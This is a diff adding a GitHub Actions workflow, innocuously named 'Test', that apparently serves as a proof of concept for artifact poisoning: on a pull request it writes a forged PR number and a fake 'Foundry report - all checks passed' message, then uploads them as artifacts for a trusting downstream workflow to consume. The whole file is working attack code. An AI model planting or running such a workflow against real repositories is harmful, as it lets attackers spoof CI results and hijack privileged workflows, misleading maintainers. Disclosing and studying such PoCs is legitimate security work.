@@ -1,0 +1,27 @@
+name: Test
+
+on:
+  pull_request:
+
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Craft attacker-controlled artifacts
+        run: |
+          mkdir -p out
+          printf '149\n' > out/pr_number.txt
+          cat > out/template.md <<'MD'
+          ### :white_check_mark: Foundry report - all checks passed
+
+          Build and tests succeeded. Authorized PoC: this body is fully attacker-controlled.
+          MD
+          cat out/pr_number.txt out/template.md
+      - uses: actions/upload-artifact@v4
+        with:
+          name: pr_number
+          path: out/pr_number.txt
+      - uses: actions/upload-artifact@v4
+        with:
+          name: ${{ github.event.pull_request.head.sha }}
+          path: out/template.md
